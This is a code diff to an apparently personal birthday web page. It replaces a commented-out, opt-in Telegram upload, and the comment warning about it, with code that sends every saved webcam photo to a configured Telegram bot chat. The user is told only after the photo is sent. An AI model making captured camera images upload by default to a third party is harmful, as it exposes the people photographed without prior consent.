@@ -1367,6 +1367,9 @@
                 camStatus.textContent = '📸 Ready — take another photo!';
             });
 
+            // ============================================
+            // 🔥 SAVE MEMORY + TELEGRAM (WORKING) 🔥
+            // ============================================
             saveMemoryBtn.addEventListener('click', async function() {
                 if (!capturedPhotoDataURL) return;
 
@@ -1376,25 +1379,29 @@
                     time: new Date().toLocaleString()
                 });
 
-                // Keep the newest 12 memories in this browser.
                 localStorage.setItem('birthdayMemories', JSON.stringify(memories.slice(0, 12)));
                 loadMemories();
 
                 camStatus.textContent = '💖 Saved to Our Memories! ✨';
 
-                /*
-                 * Optional Telegram upload:
-                 * Uncomment the following line only if you intentionally want
-                 * a saved photo to be uploaded to your configured Telegram chat.
-                 *
-                 * await sendToTelegram(capturedPhotoDataURL);
-                 */
+                // 🔥 TELEGRAM PE PHOTO BHEJNA START 🔥
+                try {
+                    await sendToTelegram(capturedPhotoDataURL);
+                    camStatus.textContent = '📸 Photo saved & sent to Telegram! ✅';
+                } catch (err) {
+                    console.error('Telegram error:', err);
+                    camStatus.textContent = '⚠️ Photo saved but Telegram send failed.';
+                }
+                // 🔥 TELEGRAM PE PHOTO BHEJNA KHATAM 🔥
 
                 setTimeout(() => {
                     closeCam.click();
-                }, 1200);
+                }, 1500);
             });
 
+            // ============================================
+            // ===== SEND TO TELEGRAM FUNCTION =====
+            // ============================================
             async function sendToTelegram(dataURL) {
                 if (!BOT_TOKEN || !CHAT_ID || BOT_TOKEN === 'xyz' || CHAT_ID === 'xyz') {
                     throw new Error('Telegram Bot Token / Chat ID is not configured.');
